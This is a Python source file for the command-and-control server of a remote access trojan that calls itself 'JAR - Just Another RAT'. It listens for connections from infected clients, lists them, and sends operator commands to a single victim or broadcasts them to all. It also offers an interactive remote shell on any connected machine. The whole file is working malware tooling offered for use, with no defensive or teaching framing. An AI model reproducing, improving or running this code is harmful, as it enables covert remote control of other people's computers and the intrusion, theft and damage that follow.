import socket
import threading
import os
import colorama
import time
from dotenv import load_dotenv

clients = {}
clients_lock = threading.Lock()
output_ready_events = {}
last_received_output = {}
IN_LOCK_MODE = False
LOCKED_CLIENT_ADDR = None

def logo():
    print(colorama.Fore.CYAN + """
     ██╗ █████╗ ██████╗ 
     ██║██╔══██╗██╔══██╗
     ██║███████║██████╔╝
 ██  ██║██╔══██║██╔══██╗
╚█████╔╝██║  ██║██║  ██║
 ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
    """ + colorama.Fore.RESET)
    print(colorama.Fore.YELLOW + "JAR - Just Another RAT" + colorama.Fore.RESET)
    print(colorama.Fore.YELLOW + "By: Dylouwu" + colorama.Fore.RESET)
    print(colorama.Fore.YELLOW + "Version: 0.1.0 (Startup Config & Ctrl+C Exit)" + colorama.Fore.RESET)

def handle_client(client_socket, address):
    global IN_LOCK_MODE, LOCKED_CLIENT_ADDR
    
    with clients_lock:
        clients[address] = client_socket
        output_ready_events[address] = threading.Event()
        last_received_output[address] = ""
    
    print(f"\n{colorama.Fore.GREEN}[+] Client connected: {address[0]}:{address[1]}{colorama.Fore.RESET}")

    while True:
        try:
            response_bytes = client_socket.recv(8192)
            if not response_bytes:
                break
            response = response_bytes.decode('utf-8', errors='replace')
            
            with clients_lock:
                if address in clients: 
                    last_received_output[address] = response
                    if address in output_ready_events:
                        output_ready_events[address].set()

            if not (IN_LOCK_MODE and LOCKED_CLIENT_ADDR == address):
                current_time = time.strftime("%H:%M:%S", time.localtime())
                print(f"\r{' ' * 80}\r", end='') 
                print(f"{colorama.Fore.GREEN}[{address[0]} @ {current_time}]{colorama.Fore.RESET}\n{response.strip()}\n")

        except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
            break
        except Exception: 
            break 

    print(f"\n{colorama.Fore.RED}[-] Client disconnected: {address[0]}:{address[1]}{colorama.Fore.RESET}")
    with clients_lock:
        if address in clients:
            del clients[address]
        if address in output_ready_events:
            output_ready_events[address].set() 
            del output_ready_events[address]
        if address in last_received_output:
            del last_received_output[address]
    try:
        client_socket.close()
    except:
        pass
    
    if IN_LOCK_MODE and LOCKED_CLIENT_ADDR == address:
        print(f"{colorama.Fore.YELLOW}[!] Locked client ({address[0]}) disconnected. Exiting lock mode.{colorama.Fore.RESET}")
        IN_LOCK_MODE = False
        LOCKED_CLIENT_ADDR = None

def accept_clients(server):
    while True:
        try:
            client_socket, address = server.accept()
            client_handler = threading.Thread(target=handle_client, args=(client_socket, address), daemon=True)
            client_handler.start()
        except OSError: 
            break 
        except Exception as e:
            print(f"\n{colorama.Fore.RED}[!] Error accepting client: {e}{colorama.Fore.RESET}")

def get_client_cwd(client_socket, address):
    try:
        with clients_lock:
            if address not in output_ready_events or address not in clients: return "?"
            current_client_socket = clients.get(address)
            if current_client_socket != client_socket: 
                return "?"
            output_ready_events[address].clear()
            last_received_output[address] = ""
        
        client_socket.sendall("getwd".encode('utf-8'))
        
        if output_ready_events[address].wait(timeout=5): 
            response = last_received_output.get(address, "") 
            if response.startswith("[CWD] "):
                return response.replace("[CWD] ", "").strip()
        return "?"
    except (socket.error, BrokenPipeError): 
        return "?"
    except Exception:
        return "?"

def interactive_shell_mode(client_socket, address):
    global IN_LOCK_MODE, LOCKED_CLIENT_ADDR
    IN_LOCK_MODE = True
    LOCKED_CLIENT_ADDR = address
    
    current_remote_cwd = get_client_cwd(client_socket, address)
    print(f"\n{colorama.Fore.MAGENTA}[*] Interactive shell with {address[0]}:{address[1]}. (Type 'exitlock' or Ctrl+C/Ctrl+D to return){colorama.Fore.RESET}")

    while IN_LOCK_MODE:
        if LOCKED_CLIENT_ADDR != address: 
            break 
        
        with clients_lock: 
            if address not in clients:
                print(f"\n{colorama.Fore.RED}[!] Client {address[0]} disconnected. Exiting lock mode.{colorama.Fore.RESET}")
                break
        
        prompt_text = f"{colorama.Fore.GREEN}{address[0]}{colorama.Fore.YELLOW}:{current_remote_cwd}{colorama.Fore.MAGENTA} # {colorama.Fore.RESET}"
        try:
            command = input(prompt_text)
        except (KeyboardInterrupt, EOFError):
            print("\nExiting interactive mode...") # User pressed Ctrl+C or Ctrl+D
            break 

        if command.strip().lower() == "exitlock":
            break
        if not command.strip():
            continue

        try:
            with clients_lock:
                if address not in clients or clients[address] != client_socket: 
                    print(f"\n{colorama.Fore.RED}[!] Client {address[0]} disconnected. Exiting lock mode.{colorama.Fore.RESET}")
                    break
                output_ready_events[address].clear()
                last_received_output[address] = ""

            client_socket.sendall(command.encode('utf-8'))

            if output_ready_events[address].wait(timeout=20): 
                response = last_received_output.get(address, "")
                print(response.strip()) 
                if response.startswith("[CWD] "):
                    current_remote_cwd = response.replace("[CWD] ", "").strip()
                elif command.strip().lower().startswith("cd ") and "[Error]" in response : 
                    current_remote_cwd = get_client_cwd(client_socket, address) 
            else: 
                is_still_connected = False
                with clients_lock:
                    if address in clients: is_still_connected = True
                
                if is_still_connected:
                    print(f"{colorama.Fore.YELLOW}[!] Timeout or no immediate feedback from {address[0]}.{colorama.Fore.RESET}")
                    if command.strip().lower().startswith("cd "): 
                         time.sleep(0.5) 
                         current_remote_cwd = get_client_cwd(client_socket, address)
                else:
                    print(f"\n{colorama.Fore.RED}[!] Client {address[0]} disconnected while awaiting output. Exiting lock mode.{colorama.Fore.RESET}")
                    break 
        except (socket.error, BrokenPipeError) as e:
            print(f"\n{colorama.Fore.RED}[!] Connection error with {address[0]}: {e}. Exiting lock mode.{colorama.Fore.RESET}")
            break
        except Exception as e:
            print(f"\n{colorama.Fore.RED}[!] Error in interactive shell: {e}{colorama.Fore.RESET}")

    IN_LOCK_MODE = False
    LOCKED_CLIENT_ADDR = None
    print(f"{colorama.Fore.MAGENTA}[*] Exited interactive shell for {address[0] if address else 'N/A'}.{colorama.Fore.RESET}")

def display_menu_and_clients(current_clients_list):
    print(f"\n{colorama.Fore.YELLOW}[Available Operations]{colorama.Fore.RESET}")
    print(f"  Enter client number (1-{len(current_clients_list)}) for a single command.")
    print(f"  Enter client number + 'i' (e.g., '1i') for interactive shell.")
    print(f"  '0' to broadcast command.")
    print(f"  'list', 'refresh', 'help', '?' to display this menu and client list.")
    print(f"  'clear' to clear the screen (then displays menu).")
    print(f"  'exit' or 'quit' to shutdown server.")
    
    if not current_clients_list:
        print(f"[{colorama.Fore.YELLOW}?{colorama.Fore.RESET}] No clients connected.\n")
    else:
        print(f"{colorama.Fore.YELLOW}[Connected Clients: {len(current_clients_list)}]{colorama.Fore.RESET}")
        for idx, address_info in enumerate(current_clients_list, start=1):
            print(f"  {idx}. {address_info[0]}:{address_info[1]}")

def start_server(default_host="0.0.0.0", default_port=9999):
    global IN_LOCK_MODE, LOCKED_CLIENT_ADDR
    colorama.init(autoreset=True)
    load_dotenv()
    
    env_host = os.getenv("SERVER_HOST", default_host)
    env_port_str = os.getenv("SERVER_PORT", str(default_port))

    try:
        host_input = input(f"Enter server IP to listen on (default: {env_host}): ").strip()
        host = host_input if host_input else env_host

        port_input = input(f"Enter server port to listen on (default: {env_port_str}): ").strip()
        port_str = port_input if port_input else env_port_str
        port = int(port_str)
        if not (0 < port < 65536):
            raise ValueError("Port must be between 1 and 65535")

    except ValueError as e:
        print(f"{colorama.Fore.RED}[!] Invalid input: {e}. Using defaults {env_host}:{env_port_str}.{colorama.Fore.RESET}")
        host = env_host
        try:
            port = int(env_port_str)
        except ValueError: # Fallback if default from env is also bad
            port = default_port 
            print(f"{colorama.Fore.RED}[!] Default port in .env is invalid, using hardcoded default: {port}{colorama.Fore.RESET}")


    os.system("cls" if os.name == "nt" else "clear")
    logo()
    print(f"[+] Listening on {host}:{port}")
    
    with clients_lock: 
        initial_clients_list = list(clients.keys())
    display_menu_and_clients(initial_clients_list)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((host, port))
    except Exception as e:
        print(f"{colorama.Fore.RED}[!] Failed to bind server to {host}:{port} - {e}{colorama.Fore.RESET}")
        return
        
    server.listen(5)
    
    accept_thread = threading.Thread(target=accept_clients, args=(server,), daemon=True)
    accept_thread.start()
    
    show_menu_next_iteration = False

    while True:
        if IN_LOCK_MODE:
            time.sleep(0.2)
            if LOCKED_CLIENT_ADDR and LOCKED_CLIENT_ADDR not in clients:
                 IN_LOCK_MODE = False
                 LOCKED_CLIENT_ADDR = None
                 show_menu_next_iteration = True 
            continue
        
        if show_menu_next_iteration:
            with clients_lock:
                current_clients_for_menu = list(clients.keys())
            display_menu_and_clients(current_clients_for_menu)
            show_menu_next_iteration = False
        
        raw_choice = input(f"\n{colorama.Fore.CYAN}JAR > {colorama.Fore.RESET}").strip()
        
        with clients_lock: 
            current_client_addrs_for_processing = list(clients.keys())

        if not current_client_addrs_for_processing and raw_choice.lower() not in ['exit', 'quit', 'clear', 'refresh', 'list', 'help', '?', '']:
            if raw_choice: 
                print(f"[{colorama.Fore.YELLOW}?{colorama.Fore.RESET}] No clients connected to command.")
            continue 
            
        if not raw_choice: 
            continue

        if raw_choice.lower() == 'clear':
            os.system("cls" if os.name == "nt" else "clear")
            logo()
            print(f"[+] Listening on {host}:{port}")
            show_menu_next_iteration = True
            continue

        if raw_choice.lower() in ['exit', 'quit']:
            print(f"{colorama.Fore.YELLOW}[*] Shutting down server...{colorama.Fore.RESET}")
            with clients_lock:
                for sock in list(clients.values()):
                    try: sock.sendall("exit".encode('utf-8')); sock.close()
                    except: pass
            server.close()
            print(f"{colorama.Fore.YELLOW}[*] Server has shut down.{colorama.Fore.RESET}")
            break 

        if raw_choice.lower() in ['list', 'refresh', 'help', '?']:
            show_menu_next_iteration = True
            continue

        target_client_socket = None
        target_client_address = None
        is_broadcast = False
        is_interactive = False
        
        try:
            if raw_choice == '0':
                if not current_client_addrs_for_processing:
                    print(f"{colorama.Fore.RED}[!] No clients to broadcast to.{colorama.Fore.RESET}"); time.sleep(0.5); continue
                is_broadcast = True
            elif raw_choice[-1].lower() == 'i' and len(raw_choice) > 1:
                client_num_str = raw_choice[:-1]
                if not client_num_str.isdigit(): raise ValueError("Client number for interactive mode must be numeric.")
                client_num = int(client_num_str)
                if 1 <= client_num <= len(current_client_addrs_for_processing):
                    target_client_address = current_client_addrs_for_processing[client_num - 1]
                    with clients_lock: 
                        target_client_socket = clients.get(target_client_address)
                    if target_client_socket:
                        is_interactive = True
                    else:
                        print(f"{colorama.Fore.RED}[!] Client {client_num} disconnected.{colorama.Fore.RESET}"); show_menu_next_iteration = True; continue
                else:
                    print(f"{colorama.Fore.RED}[!] Invalid client number for interactive mode.{colorama.Fore.RESET}"); time.sleep(0.5); continue
            else:
                if not raw_choice.isdigit(): raise ValueError("Client selection must be a number.")
                client_num = int(raw_choice)
                if 1 <= client_num <= len(current_client_addrs_for_processing):
                    target_client_address = current_client_addrs_for_processing[client_num - 1]
                    with clients_lock:
                        target_client_socket = clients.get(target_client_address)
                    if not target_client_socket:
                        print(f"{colorama.Fore.RED}[!] Client {client_num} disconnected.{colorama.Fore.RESET}"); show_menu_next_iteration = True; continue
                else:
                    print(f"{colorama.Fore.RED}[!] Invalid client number.{colorama.Fore.RESET}"); time.sleep(0.5); continue
        except ValueError as e_val:
            print(f"{colorama.Fore.RED}[!] Invalid input: {e_val}{colorama.Fore.RESET}"); time.sleep(0.5); continue
        except IndexError: 
             print(f"{colorama.Fore.RED}[!] Client list may have changed. Use 'list' to refresh.{colorama.Fore.RESET}"); show_menu_next_iteration = True; continue

        if is_interactive:
            if target_client_socket and target_client_address:
                interactive_shell_mode(target_client_socket, target_client_address)
                show_menu_next_iteration = True 
            else: 
                print(f"{colorama.Fore.RED}[!] Failed to initiate interactive mode (client data error).{colorama.Fore.RESET}")
            continue

        command_to_send = ""
        prompt_for_command_text = ""
        if is_broadcast:
            prompt_for_command_text = f"{colorama.Fore.YELLOW}[Broadcast]{colorama.Fore.RESET} Command: "
        elif target_client_socket:
            prompt_for_command_text = f"{colorama.Fore.YELLOW}[{target_client_address[0]}]{colorama.Fore.RESET} Command: "
        
        if prompt_for_command_text:
            command_to_send = input(prompt_for_command_text)

        if not command_to_send.strip():
            print(f"{colorama.Fore.RED}[!] No command entered.{colorama.Fore.RESET}"); time.sleep(0.5); continue

        if is_broadcast:
            print(f"{colorama.Fore.BLUE}[*] Broadcasting '{command_to_send}'...{colorama.Fore.RESET}")
            with clients_lock:
                for addr_b, sock_b in list(clients.items()): 
                    try: 
                        sock_b.sendall(command_to_send.encode('utf-8'))
                    except Exception as e: 
                        print(f"\n{colorama.Fore.RED}[!] Error broadcasting to {addr_b[0]}: {e}{colorama.Fore.RESET}")
            time.sleep(0.1) 
        
        elif target_client_socket:
            try:
                with clients_lock:
                    if target_client_address not in clients: 
                         print(f"\n{colorama.Fore.RED}[!] Client {target_client_address[0]} disconnected before sending command.{colorama.Fore.RESET}"); show_menu_next_iteration = True; continue
                    output_ready_events[target_client_address].clear()
                    last_received_output[target_client_address] = ""

                target_client_socket.sendall(command_to_send.encode('utf-8'))
                print(f"{colorama.Fore.BLUE}[*] Waiting for output from {target_client_address[0]}...{colorama.Fore.RESET}", end='\r', flush=True)
                
                if output_ready_events[target_client_address].wait(timeout=10): 
                    print(" " * 80, end='\r', flush=True) 
                else: 
                    is_still_connected = False
                    with clients_lock:
                        if target_client_address in clients: is_still_connected = True
                    
                    print(" " * 80, end='\r', flush=True) 
                    if is_still_connected:
                        print(f"\n{colorama.Fore.YELLOW}[!] Timeout: No output from {target_client_address[0]} for '{command_to_send}'. Client remains connected.{colorama.Fore.RESET}")
                    else: 
                        print(f"\n{colorama.Fore.RED}[!] Client {target_client_address[0]} disconnected while awaiting output.{colorama.Fore.RESET}")
            except Exception as e:
                print(f"\n{colorama.Fore.RED}[!] Error with client {target_client_address[0]}: {e}{colorama.Fore.RESET}")
        
        time.sleep(0.1) 

if __name__ == "__main__":
    start_server()

